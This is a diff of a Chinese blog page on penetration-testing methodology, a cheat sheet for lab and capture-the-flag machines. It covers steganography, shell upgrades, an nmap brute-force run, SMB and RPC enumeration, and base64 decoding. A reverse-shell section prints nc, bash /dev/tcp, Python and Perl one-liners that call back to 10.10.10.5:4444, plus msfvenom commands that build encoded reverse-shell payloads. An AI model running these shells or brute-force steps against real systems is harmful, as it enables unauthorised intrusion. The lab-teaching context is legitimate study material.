@@ -7,12 +7,13 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
 <meta name="description" content=" 本文章持续更新中
-遇见的情况以及方法论 开放的非常规端口 遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。
-┌──(kali㉿kali)-[~/Work/Kali] └─$ nc -u 10.10.10.45 1440 ? Wrong Code!! We&#39;ll notify Commander Tarkin of this offense 使用 echo 传输字符串并通过 nc 链接端口。
-┌──(kali㉿kali)-[~/Work/Kali] └─$ echo &#34;DS-1@OBS&#34; | nc -u 10.10.10.45 1440 ...... 图片分析 图片分析一般先查看隐写情况。
+遇见的情况以及方法论 图片分析 图片分析一般先查看隐写情况。
 ┌──(kali㉿kali)-[~/Work/Kali] └─$ steghide extract -sf x.jpg Enter passphrase: 解释一下这个命令，extract 为提取模式，提取图片中隐藏的内容，-sf 为 &ndash;stegofile 的缩写，指定文件为 x.jpg。需要密码的话想到的、空密码、弱密码均值得尝试。
 Bash 逃逸 在获得初始立足点后常常 bash 的交互性并不完善，通常使用 python 的 pty 库获得一个假的、交互性相对好的 bash。
 python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这个命令时，Python 调用 pty.spawn() 函数，创建一个伪终端（pseudo-terminal，简称 pty），并在该终端启动一个心得交互式 bash shell 进程。这个新的伪终端具有完整的交互能力，能够处理用户输入、输出以及终端控制信息（如回显密码提示）。一旦这个新的 shell 被创建就相当于处于一个真正的交互终端中。
+也可以尝试下面的命令。
+script -qc /bin/bash /dev/null script 时 Linux 系统自带的命令，用于记录终端会话。正常使用 script 命令时，会创建一个交互式终端并将所有会话内容记录到指定文件中。这里巧用几个特殊参数：-q 静默模式，告诉 script 不要显示开始和结束的提示信息。其次是 -c /bin/bash 告诉 script 命令，直接执行并启动一个 bash shell，而非默认 shell 或其他命令。最后，指定输出文件为 /dev/null，表示会话记录被丢弃而不保存到硬盘。
+反弹 shell Linux 现成的反弹 shell nc -e /bin/bash 10.10.10.5 4444 bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.5&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39; perl -e &#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; Msfvenom Msf 生成反弹 shell
 " />
 <meta name="keywords" content=", Hack, 技术" />
 <meta name="robots" content="noodp" />
@@ -48,26 +49,28 @@ python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这�
 
   <meta itemprop="name" content="渗透测试通用方法论">
   <meta itemprop="description" content="本文章持续更新中
-遇见的情况以及方法论 开放的非常规端口 遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。
-┌──(kali㉿kali)-[~/Work/Kali] └─$ nc -u 10.10.10.45 1440 ? Wrong Code!! We&#39;ll notify Commander Tarkin of this offense 使用 echo 传输字符串并通过 nc 链接端口。
-┌──(kali㉿kali)-[~/Work/Kali] └─$ echo &#34;DS-1@OBS&#34; | nc -u 10.10.10.45 1440 ...... 图片分析 图片分析一般先查看隐写情况。
+遇见的情况以及方法论 图片分析 图片分析一般先查看隐写情况。
 ┌──(kali㉿kali)-[~/Work/Kali] └─$ steghide extract -sf x.jpg Enter passphrase: 解释一下这个命令，extract 为提取模式，提取图片中隐藏的内容，-sf 为 –stegofile 的缩写，指定文件为 x.jpg。需要密码的话想到的、空密码、弱密码均值得尝试。
 Bash 逃逸 在获得初始立足点后常常 bash 的交互性并不完善，通常使用 python 的 pty 库获得一个假的、交互性相对好的 bash。
-python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这个命令时，Python 调用 pty.spawn() 函数，创建一个伪终端（pseudo-terminal，简称 pty），并在该终端启动一个心得交互式 bash shell 进程。这个新的伪终端具有完整的交互能力，能够处理用户输入、输出以及终端控制信息（如回显密码提示）。一旦这个新的 shell 被创建就相当于处于一个真正的交互终端中。">
+python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这个命令时，Python 调用 pty.spawn() 函数，创建一个伪终端（pseudo-terminal，简称 pty），并在该终端启动一个心得交互式 bash shell 进程。这个新的伪终端具有完整的交互能力，能够处理用户输入、输出以及终端控制信息（如回显密码提示）。一旦这个新的 shell 被创建就相当于处于一个真正的交互终端中。
+也可以尝试下面的命令。
+script -qc /bin/bash /dev/null script 时 Linux 系统自带的命令，用于记录终端会话。正常使用 script 命令时，会创建一个交互式终端并将所有会话内容记录到指定文件中。这里巧用几个特殊参数：-q 静默模式，告诉 script 不要显示开始和结束的提示信息。其次是 -c /bin/bash 告诉 script 命令，直接执行并启动一个 bash shell，而非默认 shell 或其他命令。最后，指定输出文件为 /dev/null，表示会话记录被丢弃而不保存到硬盘。
+反弹 shell Linux 现成的反弹 shell nc -e /bin/bash 10.10.10.5 4444 bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.5&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39; perl -e &#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; Msfvenom Msf 生成反弹 shell">
   <meta itemprop="datePublished" content="2025-12-27T17:29:33+08:00">
   <meta itemprop="dateModified" content="2025-12-27T17:29:33+08:00">
-  <meta itemprop="wordCount" content="656">
+  <meta itemprop="wordCount" content="857">
   <meta itemprop="keywords" content="Hack,技术">
 
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="渗透测试通用方法论">
   <meta name="twitter:description" content="本文章持续更新中
-遇见的情况以及方法论 开放的非常规端口 遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。
-┌──(kali㉿kali)-[~/Work/Kali] └─$ nc -u 10.10.10.45 1440 ? Wrong Code!! We&#39;ll notify Commander Tarkin of this offense 使用 echo 传输字符串并通过 nc 链接端口。
-┌──(kali㉿kali)-[~/Work/Kali] └─$ echo &#34;DS-1@OBS&#34; | nc -u 10.10.10.45 1440 ...... 图片分析 图片分析一般先查看隐写情况。
+遇见的情况以及方法论 图片分析 图片分析一般先查看隐写情况。
 ┌──(kali㉿kali)-[~/Work/Kali] └─$ steghide extract -sf x.jpg Enter passphrase: 解释一下这个命令，extract 为提取模式，提取图片中隐藏的内容，-sf 为 –stegofile 的缩写，指定文件为 x.jpg。需要密码的话想到的、空密码、弱密码均值得尝试。
 Bash 逃逸 在获得初始立足点后常常 bash 的交互性并不完善，通常使用 python 的 pty 库获得一个假的、交互性相对好的 bash。
-python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这个命令时，Python 调用 pty.spawn() 函数，创建一个伪终端（pseudo-terminal，简称 pty），并在该终端启动一个心得交互式 bash shell 进程。这个新的伪终端具有完整的交互能力，能够处理用户输入、输出以及终端控制信息（如回显密码提示）。一旦这个新的 shell 被创建就相当于处于一个真正的交互终端中。">
+python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这个命令时，Python 调用 pty.spawn() 函数，创建一个伪终端（pseudo-terminal，简称 pty），并在该终端启动一个心得交互式 bash shell 进程。这个新的伪终端具有完整的交互能力，能够处理用户输入、输出以及终端控制信息（如回显密码提示）。一旦这个新的 shell 被创建就相当于处于一个真正的交互终端中。
+也可以尝试下面的命令。
+script -qc /bin/bash /dev/null script 时 Linux 系统自带的命令，用于记录终端会话。正常使用 script 命令时，会创建一个交互式终端并将所有会话内容记录到指定文件中。这里巧用几个特殊参数：-q 静默模式，告诉 script 不要显示开始和结束的提示信息。其次是 -c /bin/bash 告诉 script 命令，直接执行并启动一个 bash shell，而非默认 shell 或其他命令。最后，指定输出文件为 /dev/null，表示会话记录被丢弃而不保存到硬盘。
+反弹 shell Linux 现成的反弹 shell nc -e /bin/bash 10.10.10.5 4444 bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.5&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39; perl -e &#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; Msfvenom Msf 生成反弹 shell">
 
 
 
@@ -140,7 +143,7 @@ python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这�
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        4 minutes
+        5 minutes
 
         
       </p>
@@ -161,7 +164,6 @@ python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这�
   <ul>
     <li><a href="#遇见的情况以及方法论">遇见的情况以及方法论</a>
       <ul>
-        <li><a href="#开放的非常规端口">开放的非常规端口</a></li>
         <li><a href="#图片分析">图片分析</a></li>
         <li><a href="#bash-逃逸">Bash 逃逸</a></li>
         <li><a href="#反弹-shell">反弹 shell</a></li>
@@ -175,6 +177,12 @@ python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这�
         <li><a href="#爆破相关">爆破相关</a></li>
         <li><a href="#共享目录相关">共享目录相关</a></li>
         <li><a href="#缓冲区溢出">缓冲区溢出</a></li>
+        <li><a href="#嗅探">嗅探</a></li>
+        <li><a href="#命令行解密">命令行解密</a></li>
+        <li><a href="#135-rcp">135 RCP</a></li>
+        <li><a href="#nc">Nc</a></li>
+        <li><a href="#加密识别">加密识别</a></li>
+        <li><a href="#传输文件">传输文件</a></li>
       </ul>
     </li>
   </ul>
@@ -188,19 +196,7 @@ python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这�
         <blockquote>
 <p>本文章持续更新中</p></blockquote>
 <h2 id="遇见的情况以及方法论">遇见的情况以及方法论</h2>
-<h3 id="开放的非常规端口">开放的非常规端口</h3>
-<p>遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ nc -u 10.10.10.45 <span style="color:#ae81ff">1440</span>
-</span></span><span style="display:flex;"><span>?
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Wrong Code!!
-</span></span><span style="display:flex;"><span>We<span style="color:#960050;background-color:#1e0010">&#39;</span>ll notify Commander Tarkin of this offense
-</span></span></code></pre></div><p>使用 echo 传输字符串并通过 nc 链接端口。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;DS-1@OBS&#34;</span> | nc -u 10.10.10.45 <span style="color:#ae81ff">1440</span>
-</span></span><span style="display:flex;"><span>......
-</span></span></code></pre></div><h3 id="图片分析">图片分析</h3>
+<h3 id="图片分析">图片分析</h3>
 <p>图片分析一般先查看隐写情况。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ steghide extract -sf x.jpg
@@ -217,16 +213,16 @@ python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34; 运行上面这�
 <h4 id="linux">Linux</h4>
 <h5 id="现成的反弹-shell">现成的反弹 shell</h5>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -e /bin/bash 10.10.10.5 <span style="color:#ae81ff">4444</span>
-</span></span></code></pre></div><pre tabindex="0"><code>bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34;
-</code></pre><pre tabindex="0"><code>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.5&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;
-</code></pre><pre tabindex="0"><code>perl -e &#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
-</code></pre><h5 id="msfvenom">Msfvenom</h5>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.5&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>perl -e <span style="color:#e6db74">&#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
+</span></span></code></pre></div><h5 id="msfvenom">Msfvenom</h5>
 <p>Msf 生成反弹 shell</p>
-<pre tabindex="0"><code>sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
-</code></pre><p>生成二进制脚本</p>
-<pre tabindex="0"><code>sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.5 LPORT=443 -b &#34;\x00&#34; -e x86/shikata_ga_nai -f c
-</code></pre><pre tabindex="0"><code>sudo msfvenom -p linux/x86/exec CMD=&#34;/bin/bash&#34; -b &#34;\x00&#34; -e x86/shikata_ga_nai -f c
-</code></pre><h3 id="文件分析">文件分析</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.10.5 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f elf -o shell.elf
+</span></span></code></pre></div><p>生成二进制脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.10.5 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -b <span style="color:#e6db74">&#34;\x00&#34;</span> -e x86/shikata_ga_nai -f c
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfvenom -p linux/x86/exec CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span> -b <span style="color:#e6db74">&#34;\x00&#34;</span> -e x86/shikata_ga_nai -f c
+</span></span></code></pre></div><h3 id="文件分析">文件分析</h3>
 <p>在拿到一个文件后可进行如下分析：</p>
 <p><img src="P1.png" alt="P1"></p>
 <p>file 命令是识别文件类型和格式，通过分析文件头信息等数据来判断文件实际的内容与格式，从输出结果来看， /bin/dartvader 是一个 32 位的 ELF 可执行文件，并设置了 setuid 位，这意味着无论哪个用户执行这个程序，它都会以文件所有者的权限进行，动态链接表明该程序在运行时需要调用共享库，而 <code>not stripped</code> 则说明这个可执行文件中仍保留有符号信息与调试信息，这对逆向工程非常有利。在渗透测试场景下，如果测试者发现这样一个 setuid 程序，可以重点关注它是否存在提权漏洞，比如通过错误的权限验证、缓冲区溢出或者不安全的函数调用来实现提权。此外，未剥离的符号信息可能让分析人员更容易理解程序的内部逻辑，从而寻找可能的漏洞或不当行为，这对进一步的利用或者漏洞利用代码的编写往往有利，可以看一下可识别字符佐证发现。</p>
@@ -292,7 +288,27 @@ ElX+bGho7xDsCOubcJxarL+rGEZ5DQTxpAjGk=
 <li>FUZZ：<code>ffuf</code> 的关键占位符</li>
 <li>-ac：自动校准模式</li>
 </ul>
-<h4 id="暴力破解">暴力破解</h4>
+<h4 id="登入认证破解">登入认证破解</h4>
+<h5 id="nmap">Nmap</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -p80 --script<span style="color:#f92672">=</span>http-brute 10.129.5.91  
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-02-28 08:11 EST
+</span></span><span style="display:flex;"><span>Stats: 0:08:01 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Script Scan
+</span></span><span style="display:flex;"><span>NSE Timing: About 0.00% <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>Stats: 0:08:47 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Script Scan
+</span></span><span style="display:flex;"><span>NSE Timing: About 0.00% <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.5.91
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.095s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>| http-brute: 
+</span></span><span style="display:flex;"><span>|   Accounts: 
+</span></span><span style="display:flex;"><span>|     admin:admin - Valid credentials
+</span></span><span style="display:flex;"><span>|_  Statistics: Performed <span style="color:#ae81ff">45009</span> guesses in <span style="color:#ae81ff">535</span> seconds, average tps: 84.6
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 535.72 seconds
+</span></span></code></pre></div><h4 id="暴力破解">暴力破解</h4>
 <h5 id="hashcat">Hashcat</h5>
 <p>破解 <code>MD5</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hashcat -m <span style="color:#ae81ff">0</span> -a <span style="color:#ae81ff">0</span> hash/hash.lst /usr/share/wordlists/rockyou.txt
@@ -341,6 +357,12 @@ ElX+bGho7xDsCOubcJxarL+rGEZ5DQTxpAjGk=
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo smbclient -N -L <span style="color:#ae81ff">\\\\</span>10.10.10.10
 </span></span></code></pre></div><p>连接到 SMB 共享</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo smbclient <span style="color:#ae81ff">\\\\</span>10.10.10.10<span style="color:#ae81ff">\\</span>enil
+</span></span></code></pre></div><h4 id="nxc">NXC</h4>
+<p>使用 nxc 进行 SMB 共享枚举，尝试使用空密码进行匿名登入。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb driver.htb --shares -u enil -p <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.5.91     <span style="color:#ae81ff">445</span>    DRIVER           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> Build <span style="color:#ae81ff">10240</span> x64 <span style="color:#f92672">(</span>name:DRIVER<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:DRIVER<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>SMB         10.129.5.91     <span style="color:#ae81ff">445</span>    DRIVER           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DRIVER<span style="color:#ae81ff">\e</span>nil: STATUS_LOGON_FAILURE
 </span></span></code></pre></div><h3 id="缓冲区溢出">缓冲区溢出</h3>
 <h4 id="msf">Msf</h4>
 <p>创建 600 字节缓冲区</p>
@@ -350,6 +372,46 @@ ElX+bGho7xDsCOubcJxarL+rGEZ5DQTxpAjGk=
 </span></span></code></pre></div><p>jum esp</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-nasm_shell
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jmp esp
+</span></span></code></pre></div><h3 id="嗅探">嗅探</h3>
+<h4 id="responder">Responder</h4>
+<h3 id="命令行解密">命令行解密</h3>
+<h4 id="base64">base64</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;NURHR1EtUExWNDEtSFk4MUYtR0dOM0Y=&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span>5DGGQ-PLV41-HY81F-GGN3F
+</span></span></code></pre></div><h3 id="135-rcp">135 RCP</h3>
+<p>连接 135 rcp 端口。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ rpcclient -U <span style="color:#e6db74">&#39;&#39;</span> -N 10.129.5.91
+</span></span><span style="display:flex;"><span>Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
+</span></span></code></pre></div><ul>
+<li>-U 指定用户名参数，使用空字符串表示匿名用户</li>
+<li>-N 表示不使用密码进行认证</li>
+</ul>
+<h3 id="nc">Nc</h3>
+<p>遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -u 10.10.10.45 <span style="color:#ae81ff">1440</span>
+</span></span><span style="display:flex;"><span>?
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Wrong Code!!
+</span></span><span style="display:flex;"><span>We<span style="color:#960050;background-color:#1e0010">&#39;</span>ll notify Commander Tarkin of this offense
+</span></span></code></pre></div><p>使用 echo 传输字符串并通过 nc 链接端口。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;DS-1@OBS&#34;</span> | nc -u 10.10.10.45 <span style="color:#ae81ff">1440</span>
+</span></span><span style="display:flex;"><span>......
+</span></span></code></pre></div><h3 id="加密识别">加密识别</h3>
+<h4 id="nth">Nth</h4>
+<pre tabindex="0"><code>nth --file Test
+</code></pre><h3 id="传输文件">传输文件</h3>
+<h4 id="windows">Windows</h4>
